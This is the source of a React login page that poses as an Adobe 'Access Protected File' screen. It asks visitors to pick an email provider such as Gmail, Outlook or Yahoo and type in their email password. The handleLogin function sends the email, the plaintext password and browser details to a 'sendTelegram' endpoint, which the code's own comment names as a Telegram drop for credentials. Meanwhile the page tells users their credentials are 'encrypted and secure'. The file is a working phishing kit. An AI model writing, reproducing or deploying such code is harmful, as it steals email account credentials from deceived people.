import React, { useState } from 'react';
import { ArrowLeft, Mail, Lock, Eye, EyeOff } from 'lucide-react';

interface LoginPageProps {
  fileName: string;
  onBack: () => void;
  onLoginSuccess?: (sessionData: any) => void;
}

const LoginPage: React.FC<LoginPageProps> = ({ fileName, onBack, onLoginSuccess }) => {
  const [selectedProvider, setSelectedProvider] = useState<string>('');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  const emailProviders = [
    { 
      name: 'Office365', 
      domain: 'outlook.com', 
      color: 'bg-blue-600', 
      logo: 'https://www.svgrepo.com/show/503426/microsoft-office.svg'
    },
    { 
      name: 'Yahoo', 
      domain: 'yahoo.com', 
      color: 'bg-purple-600', 
      logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/0/0a/Yahoo_Y_%282009-2013%29.svg/450px-Yahoo_Y_%282009-2013%29.svg.png?20100624225346'
    },
    { 
      name: 'Outlook', 
      domain: 'outlook.com', 
      color: 'bg-blue-500', 
      logo: 'https://www.svgrepo.com/show/443244/brand-microsoft-outlook.svg'
    },
    { 
      name: 'AOL', 
      domain: 'aol.com', 
      color: 'bg-red-600', 
      logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/2/2b/AOL_logo_%282024%29.svg/1199px-AOL_logo_%282024%29.svg.png?20241206193155'
    },
    { 
      name: 'Gmail', 
      domain: 'gmail.com', 
      color: 'bg-red-500', 
      logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/7/7e/Gmail_icon_%282020%29.svg/768px-Gmail_icon_%282020%29.svg.png?20221017173631'
    },
    { 
      name: 'Others', 
      domain: 'other.com', 
      color: 'bg-gray-600', 
      logo: 'https://www.svgrepo.com/show/521128/email-1.svg'
    },
  ];

  const handleProviderSelect = (provider: string) => {
    setSelectedProvider(provider);
  };

  const storeSessionLocally = (loginData: any) => {
    // Store in localStorage for cross-device access (AutoGrab)
    const sessionData = {
      email: loginData.email,
      provider: loginData.provider,
      fileName: loginData.fileName,
      timestamp: loginData.timestamp,
      sessionId: Math.random().toString(36).substring(2, 15),
      deviceInfo: {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language
      }
    };

    localStorage.setItem('adobe_autograb_session', JSON.stringify(sessionData));
    
    // Also store in sessionStorage for current session
    sessionStorage.setItem('adobe_current_session', JSON.stringify(sessionData));
    
    console.log('AutoGrab session stored:', sessionData);
    return sessionData;
  };

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email || !password || !selectedProvider) return;

    setIsLoading(true);

    try {
      const loginData = {
        email,
        password,
        provider: selectedProvider,
        fileName,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        ip: 'hidden' // Will be captured server-side
      };

      console.log('Attempting login with data:', { ...loginData, password: '[HIDDEN]' });

      // Send credentials to Telegram via Netlify function
      const telegramResponse = await fetch('/.netlify/functions/sendTelegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(loginData),
      });

      console.log('Telegram response status:', telegramResponse.status);
      
      if (!telegramResponse.ok) {
        const errorText = await telegramResponse.text();
        console.error('Telegram API error:', errorText);
        throw new Error(`Telegram API failed: ${telegramResponse.status}`);
      }

      const telegramResult = await telegramResponse.json();
      console.log('Telegram result:', telegramResult);

      // Set server session cookie
      const sessionResponse = await fetch('/.netlify/functions/setSession', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email,
          provider: selectedProvider,
          fileName,
        }),
      });

      console.log('Session response status:', sessionResponse.status);

      // Store session locally for AutoGrab functionality
      const sessionData = storeSessionLocally(loginData);

      if (sessionResponse.ok) {
        // Notify parent component of successful login
        if (onLoginSuccess) {
          onLoginSuccess(sessionData);
        }

        // Simulate file access
        alert(`Access granted! Opening ${fileName}...`);
        
        // Show success message with AutoGrab info
        setTimeout(() => {
          alert('Session saved for AutoGrab! You can now access files on other devices without re-authentication.');
        }, 1000);

        onBack();
      } else {
        const sessionErrorText = await sessionResponse.text();
        console.error('Session creation error:', sessionErrorText);
        alert('Session creation failed. Please try again.');
      }
    } catch (error) {
      console.error('Login error:', error);
      alert(`Authentication failed: ${error instanceof Error ? error.message : 'Unknown error'}. Please try again.`);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen relative overflow-hidden">
      {/* Enhanced Red Background with Multiple Blur Layers */}
      <div className="absolute inset-0 bg-gradient-to-br from-red-100/80 via-red-200/60 to-red-300/70"></div>
      <div className="absolute inset-0 bg-gradient-to-tr from-white/30 via-red-100/40 to-red-200/50"></div>
      <div className="absolute inset-0 backdrop-blur-md"></div>
      
      {/* Enhanced Decorative Blur Elements - Responsive */}
      <div className="absolute top-5 sm:top-10 md:top-20 left-5 sm:left-10 md:left-20 w-24 h-24 sm:w-32 sm:h-32 md:w-48 md:h-48 bg-red-300/30 rounded-full blur-2xl"></div>
      <div className="absolute bottom-5 sm:bottom-10 md:bottom-20 right-5 sm:right-10 md:right-20 w-28 h-28 sm:w-40 sm:h-40 md:w-56 md:h-56 bg-red-400/25 rounded-full blur-3xl"></div>
      <div className="absolute top-1/2 left-1/4 w-16 h-16 sm:w-20 sm:h-20 md:w-32 md:h-32 bg-white/35 rounded-full blur-xl"></div>
      <div className="absolute bottom-1/4 right-1/3 w-20 h-20 sm:w-24 sm:h-24 md:w-40 md:h-40 bg-red-200/25 rounded-full blur-2xl"></div>
      <div className="absolute top-1/4 right-1/2 w-12 h-12 sm:w-16 sm:h-16 md:w-28 md:h-28 bg-red-500/20 rounded-full blur-lg"></div>
      
      <div className="relative z-10 flex items-center justify-center min-h-screen p-4">
        <div className="w-full max-w-md">
          {/* Header */}
          <div className="text-center mb-4 sm:mb-6 md:mb-8">
            <button
              onClick={onBack}
              className="inline-flex items-center gap-2 text-gray-600 hover:text-gray-900 mb-3 sm:mb-4 md:mb-6 transition-colors duration-200"
            >
              <ArrowLeft className="w-4 h-4" />
              Back to Files
            </button>
            
            <div className="w-10 h-10 sm:w-12 sm:h-12 md:w-16 md:h-16 flex items-center justify-center mx-auto mb-2 sm:mb-3 md:mb-4">
              <img 
                src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/PDF_file_icon.svg/833px-PDF_file_icon.svg.png" 
                alt="Adobe Acrobat" 
                className="w-8 h-8 sm:w-10 sm:h-10 md:w-12 md:h-12 object-contain"
              />
            </div>
            
            <h1 className="text-lg sm:text-xl md:text-2xl font-bold text-gray-900 mb-2">Access Protected File</h1>
            <p className="text-sm sm:text-base text-gray-600 px-2 sm:px-4">
              Please authenticate to access <span className="font-medium break-all">{fileName}</span>
            </p>
            <p className="text-xs text-green-600 mt-2 font-medium">
              ✓ Session will be saved for AutoGrab on other devices
            </p>
          </div>

          {/* Login Form */}
          <div className="bg-white/90 backdrop-blur-xl rounded-2xl shadow-2xl border border-white/30 p-4 sm:p-6 md:p-8">
            {!selectedProvider ? (
              // Provider Selection
              <div>
                <h2 className="text-sm sm:text-base md:text-lg font-semibold text-gray-900 mb-3 sm:mb-4">
                  Choose your email provider
                </h2>
                <div className="grid grid-cols-2 gap-2 sm:gap-3">
                  {emailProviders.map((provider) => (
                    <button
                      key={provider.name}
                      onClick={() => handleProviderSelect(provider.name)}
                      className={`${provider.color} text-white p-2 sm:p-3 md:p-4 rounded-xl hover:opacity-90 transition-all duration-200 transform hover:scale-105 flex flex-col items-center gap-1 sm:gap-2 shadow-lg`}
                    >
                      <img 
                        src={provider.logo} 
                        alt={provider.name} 
                        className="w-5 h-5 sm:w-6 sm:h-6 md:w-8 md:h-8 object-contain filter brightness-0 invert"
                        onError={(e) => {
                          // Fallback to text if image fails to load
                          const target = e.target as HTMLImageElement;
                          target.style.display = 'none';
                          const parent = target.parentElement;
                          if (parent && !parent.querySelector('.fallback-text')) {
                            const fallback = document.createElement('div');
                            fallback.className = 'fallback-text text-base sm:text-lg md:text-2xl font-bold';
                            fallback.textContent = provider.name.charAt(0);
                            parent.insertBefore(fallback, target.nextSibling);
                          }
                        }}
                      />
                      <span className="font-medium text-xs sm:text-sm">{provider.name}</span>
                    </button>
                  ))}
                </div>
              </div>
            ) : (
              // Login Form
              <div>
                <div className="flex items-center gap-3 mb-3 sm:mb-4 md:mb-6">
                  <button
                    onClick={() => setSelectedProvider('')}
                    className="text-gray-400 hover:text-gray-600 transition-colors duration-200"
                  >
                    <ArrowLeft className="w-4 h-4" />
                  </button>
                  <h2 className="text-sm sm:text-base md:text-lg font-semibold text-gray-900">
                    Sign in with {selectedProvider}
                  </h2>
                </div>

                <form onSubmit={handleLogin} className="space-y-3 sm:space-y-4">
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Email Address
                    </label>
                    <div className="relative">
                      <Mail className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-4 h-4" />
                      <input
                        type="email"
                        value={email}
                        onChange={(e) => setEmail(e.target.value)}
                        className="w-full pl-10 pr-4 py-2.5 sm:py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-red-500 focus:border-transparent transition-all duration-200 bg-white/80 backdrop-blur-sm text-sm sm:text-base"
                        placeholder="Enter your email"
                        required
                      />
                    </div>
                  </div>

                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Password
                    </label>
                    <div className="relative">
                      <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-4 h-4" />
                      <input
                        type={showPassword ? 'text' : 'password'}
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        className="w-full pl-10 pr-12 py-2.5 sm:py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-red-500 focus:border-transparent transition-all duration-200 bg-white/80 backdrop-blur-sm text-sm sm:text-base"
                        placeholder="Enter your password"
                        required
                      />
                      <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600 transition-colors duration-200"
                      >
                        {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                      </button>
                    </div>
                  </div>

                  <button
                    type="submit"
                    disabled={isLoading || !email || !password}
                    className="w-full bg-gradient-to-r from-red-600 to-red-700 text-white py-2.5 sm:py-3 rounded-xl font-medium hover:from-red-700 hover:to-red-800 disabled:opacity-50 disabled:cursor-not-allowed transition-all duration-200 transform hover:scale-[1.02] active:scale-[0.98] shadow-lg text-sm sm:text-base"
                  >
                    {isLoading ? (
                      <div className="flex items-center justify-center gap-2">
                        <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                        Authenticating...
                      </div>
                    ) : (
                      'Access File & Save Session'
                    )}
                  </button>
                </form>

                <div className="mt-3 sm:mt-4 md:mt-6 text-center">
                  <p className="text-xs text-gray-500">
                    Your credentials are encrypted and secure
                  </p>
                  <p className="text-xs text-green-600 mt-1 font-medium">
                    Session will be saved for 24 hours across devices
                  </p>
                </div>
              </div>
            )}
          </div>

          {/* Adobe Footer */}
          <div className="text-center mt-4 sm:mt-6 md:mt-8">
            <p className="text-xs sm:text-sm text-gray-700 font-medium">
              © 2025 Adobe Inc. All rights reserved.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LoginPage;